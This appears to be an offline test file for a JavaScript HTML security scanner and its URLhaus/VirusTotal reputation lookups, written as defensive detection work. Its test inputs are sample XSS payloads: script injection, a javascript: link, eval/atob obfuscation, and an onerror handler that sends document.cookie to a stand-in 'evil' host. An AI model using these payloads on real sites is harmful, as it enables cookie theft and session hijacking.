// security-scan.test.mjs — OFFLINE tests. Static detector runs purely; reputation lookups use an
// injected fetch via __setFetch so no network is touched.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanContent, urlReputation, fileHashReputation, scan, __setFetch } from './security-scan.mjs';

// helper: build a fake fetch returning given json with ok:true
function fakeFetch(json, ok = true, status = 200) {
  return async () => ({ ok, status, json: async () => json });
}

test('scanContent: clean HTML scores 0 and is clean', () => {
  const r = scanContent('<p>Hello <a href="https://example.com/page">world</a></p><img src="https://x/y.png">');
  assert.equal(r.score, 0);
  assert.equal(r.clean, true);
  assert.deepEqual(r.threats, []);
});

test('scanContent: empty / non-string is clean', () => {
  assert.equal(scanContent('').clean, true);
  assert.equal(scanContent(undefined).clean, true);
  assert.equal(scanContent(null).score, 0);
});

test('scanContent: catches inline <script>', () => {
  const r = scanContent('<div><script>alert(document.cookie)</script></div>');
  assert.ok(r.threats.some((t) => t.kind === 'inline-script' && t.severity === 'block'));
  assert.ok(r.score >= 10);
  assert.equal(r.clean, false);
});

test('scanContent: catches suspicious iframe', () => {
  const r = scanContent('<iframe src="https://evil.example/payload"></iframe>');
  assert.ok(r.threats.some((t) => t.kind === 'suspicious-iframe' && t.severity === 'block'));
});

test('scanContent: catches javascript: URL', () => {
  const r = scanContent('<a href="javascript:stealCreds()">click</a>');
  assert.ok(r.threats.some((t) => t.kind === 'javascript-url'));
});

test('scanContent: catches onerror / event handler (MySpace/NeoPets embed shape)', () => {
  const r = scanContent('<img src="x" onerror="fetch(\'//evil/\'+document.cookie)">');
  assert.ok(r.threats.some((t) => t.kind === 'event-handler' && t.severity === 'block'));
});

test('scanContent: catches base64/eval obfuscation', () => {
  const r = scanContent('<script>eval(atob("YWxlcnQoMSk="))</script>');
  const kinds = r.threats.map((t) => t.kind);
  assert.ok(kinds.includes('eval-obfuscation'));
  assert.ok(kinds.includes('base64-decode-exec'));
});

test('scanContent: catches data: exec URI', () => {
  const r = scanContent('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>');
  assert.ok(r.threats.some((t) => t.kind === 'data-exec-uri'));
});

test('scanContent: catches hidden redirect / meta refresh', () => {
  const r = scanContent('<meta http-equiv="refresh" content="0;url=https://evil.example">');
  assert.ok(r.threats.some((t) => t.kind === 'meta-refresh-redirect'));
});

test('scanContent: snippet is clipped and present', () => {
  const r = scanContent('<script>' + 'A'.repeat(500) + '</script>');
  const t = r.threats.find((x) => x.kind === 'inline-script');
  assert.ok(t.snippet.length <= 130);
  assert.ok(t.why && typeof t.why === 'string');
});

test('urlReputation: URLhaus listed → malicious normalized', async () => {
  __setFetch(fakeFetch({ query_status: 'ok', url_status: 'online', threat: 'malware_download' }));
  const r = await urlReputation('http://bad.example/x.exe');
  assert.equal(r.malicious, true);
  const uh = r.sources.find((s) => s.source === 'urlhaus');
  assert.equal(uh.malicious, true);
  __setFetch(null);
});

test('urlReputation: URLhaus no_results → not malicious, vt no_key', async () => {
  delete process.env.VIRUSTOTAL_KEY;
  __setFetch(fakeFetch({ query_status: 'no_results' }));
  const r = await urlReputation('http://clean.example/');
  assert.equal(r.malicious, false);
  const vt = r.sources.find((s) => s.source === 'virustotal');
  assert.equal(vt.detail, 'no_key');
  __setFetch(null);
});

test('urlReputation: fetch throwing soft-fails (never throws)', async () => {
  __setFetch(async () => { throw new Error('network down'); });
  const r = await urlReputation('http://x.example/');
  assert.equal(r.malicious, false);
  assert.ok(r.sources.some((s) => s.detail === 'unreachable'));
  __setFetch(null);
});

test('urlReputation: VirusTotal consulted when key set', async () => {
  process.env.VIRUSTOTAL_KEY = 'test-key-not-real';
  let calls = 0;
  __setFetch(async (url) => {
    calls++;
    if (String(url).includes('urlhaus')) return { ok: true, status: 200, json: async () => ({ query_status: 'no_results' }) };
    return { ok: true, status: 200, json: async () => ({ data: { attributes: { last_analysis_stats: { malicious: 3, suspicious: 1 } } } }) };
  });
  const r = await urlReputation('http://maybe.example/');
  assert.equal(r.malicious, true);
  const vt = r.sources.find((s) => s.source === 'virustotal');
  assert.equal(vt.malicious, true);
  assert.ok(calls >= 2);
  delete process.env.VIRUSTOTAL_KEY;
  __setFetch(null);
});

test('fileHashReputation: no key → no_key, not malicious', async () => {
  delete process.env.VIRUSTOTAL_KEY;
  const r = await fileHashReputation('a'.repeat(64));
  assert.equal(r.malicious, false);
  assert.equal(r.sources[0].detail, 'no_key');
});

test('fileHashReputation: VT flags → malicious', async () => {
  process.env.VIRUSTOTAL_KEY = 'k';
  __setFetch(fakeFetch({ data: { attributes: { last_analysis_stats: { malicious: 7, suspicious: 0 } } } }));
  const r = await fileHashReputation('b'.repeat(64));
  assert.equal(r.malicious, true);
  delete process.env.VIRUSTOTAL_KEY;
  __setFetch(null);
});

test('fileHashReputation: 404 → not_found, soft-fail', async () => {
  process.env.VIRUSTOTAL_KEY = 'k';
  __setFetch(fakeFetch({}, false, 404));
  const r = await fileHashReputation('c'.repeat(64));
  assert.equal(r.malicious, false);
  assert.equal(r.sources[0].detail, 'not_found');
  delete process.env.VIRUSTOTAL_KEY;
  __setFetch(null);
});

test('scan: combines content + url + hash, picks block verdict', async () => {
  delete process.env.VIRUSTOTAL_KEY;
  __setFetch(fakeFetch({ query_status: 'no_results' }));
  const r = await scan({ html: '<script>alert(1)</script>', url: 'http://x.example/' });
  assert.equal(r.verdict, 'block');
  assert.equal(r.malicious, true);
  assert.ok(r.content.threats.length > 0);
  assert.ok(r.url);
  __setFetch(null);
});

test('scan: clean html, no url → clean verdict', async () => {
  const r = await scan({ html: '<p>safe content</p>' });
  assert.equal(r.verdict, 'clean');
  assert.equal(r.malicious, false);
  assert.equal(r.url, null);
  assert.equal(r.hash, null);
});

test('scan: malicious url alone (clean html) → block', async () => {
  delete process.env.VIRUSTOTAL_KEY;
  __setFetch(fakeFetch({ query_status: 'ok', url_status: 'online', threat: 'malware_download' }));
  const r = await scan({ html: '<p>ok</p>', url: 'http://bad.example/' });
  assert.equal(r.malicious, true);
  assert.equal(r.verdict, 'block');
  __setFetch(null);
});
